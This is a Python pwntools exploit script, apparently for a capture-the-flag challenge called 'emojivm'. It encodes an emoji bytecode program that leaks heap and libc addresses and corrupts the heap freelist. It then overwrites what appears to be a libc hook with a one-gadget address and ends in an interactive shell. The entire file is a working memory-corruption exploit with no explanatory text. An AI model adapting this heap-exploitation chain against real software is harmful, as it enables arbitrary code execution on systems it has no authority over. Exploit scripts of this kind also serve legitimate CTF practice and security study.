from pwn import *

u = lambda x: x.encode('utf8')

def data_code(data):
	if data == 0:
		return u'\U0001f600'
	elif data == 1:
		return u'\U0001f601'
	elif data == 2:
		return u'\U0001f602'
	elif data == 3:
		return u'\U0001f923'
	elif data == 4:
		return u'\U0001f61c'
	elif data == 5:
		return u'\U0001f604'
	elif data == 6:
		return u'\U0001f605'
	elif data == 7:
		return u'\U0001f606'
	elif data == 8:
		return u'\U0001f609'
	elif data == 9:
		return u'\U0001f60a'
	elif data == 10:
		return u'\U0001f60d'

def add():
	return u(u'\u2795')

def sub():
	return u(u'\u2796')

def mul():
	return u(u'\u274c')

def push(word):
	return u(u"\u23ec") + u(data_code(word))

def pop():
	return u(u'\U0001f51d')

def malloc():
	return u(u'\U0001f195')

def gwrite(gidx, pidx, data, cb, cb2=None):
	p = ""
	for item in data[::-1]:
		p += push(item)
	p += cb()
	if cb2 != None:
		p += cb2()

	if pidx > 10:
		p += push(pidx % 10)
		p += push(10)
		p += push(pidx / 10)
		p += mul()
		p += add()
	else:
		p += push(pidx)
	p += push(gidx)
	p += u(u'\U0001f4e5')
	return p

def gtos():
	op = u'\U0001f4e4'
	return u(op)

def stog(gidx, pidx):
	return push(pidx) + push(gidx) + u(u'\U0001f4e5')

def readgptr(idx):
	return push(idx) + u(u'\U0001f4c4')

def write(idx):
	return push(idx) + u(u'\U0001f4dd')

def stackdump():
	return u(u'\U0001f521')

def wleak():
	return u(u'\U0001f522')

def genAscii(target):
	t = ord(target)
	return [t / 10, 10, t % 10], [mul, add]

def writegptr(idx) : 
	return push(idx) + u(u'\U0001f4dd')

def freegptr(idx) : 
	return push(idx) + u(u'\U0001f193')

def inputgptr(idx,ptridx2,value) : 
	return push(value) + push(ptridx2) + push(idx) + u(u'\U0001f4e5')

pay = ""

for i in range(5):
	pay += push(8)
	pay += malloc()

pay += push(8)
pay += push(10)
pay += mul()
pay += malloc()

pay += push(8)
pay += push(10)
pay += mul()
pay += malloc()

pay += stog(0,0)

for i in range(9) :
	pay += pop()

pay += wleak()

pay += freegptr(4)
pay += freegptr(3)

#overwrite heappointer
pay += push(3)
pay += push(8)
pay += push(8)
pay += mul()
pay += mul()
pay += add()
pay += readgptr(5) # only remote (why?)

#overwrite fd
pay += push(3)
pay += push(8)
pay += push(8)
pay += mul()
pay += mul()

pay += push(0)
pay += push(0)
pay += u(u'\U0001f4e5') #push gptr

pay += readgptr(5)

for i in range(2):
	pay += push(8)
	pay += malloc()

pay += readgptr(5)

pay += writegptr(5)
pay += writegptr(3)

pay += readgptr(5)
pay += readgptr(3)
pay += readgptr(5)
pay += freegptr(5)


with open("./chal.evm", "wb") as f:
	f.write(pay)

with open("/home/vagrant/Hacking/IDA_DEBUG/chal.evm", "wb") as f:
	f.write(pay)

sleep(0.3)

debug = False

if debug == True:
	p = process("/home/vagrant/Hacking/IDA_DEBUG/linux_server64")#, env={"LD_PRELOAD": "./libc.so.6"})	
	p.recvuntil("23946...")
	p.recvuntil("...\n")
else:
	p = process(["./emojivm", "chal.evm"],env={"LD_PRELOAD":"./libc.so.6"})#,aslr=False)

	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


heap = int(p.recv(14))
print hex(heap)


sleep(0.3)

p.sendline(p64(0)+p64(0x21)+p64(0))

sleep(0.3)

p.sendline(p64(0)+p64(0x21)+p64(0x30)+p64(heap+0x410))

libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - (0x3ebc40+96)

print hex(libcbase)

sleep(0.3)

p.sendline(p64(0)+p64(0x21)+p64(10)+p64(libcbase+0x3ed8e8))

sleep(0.3)

p.sendline(p64(libcbase+0x4f322))

p.interactive()
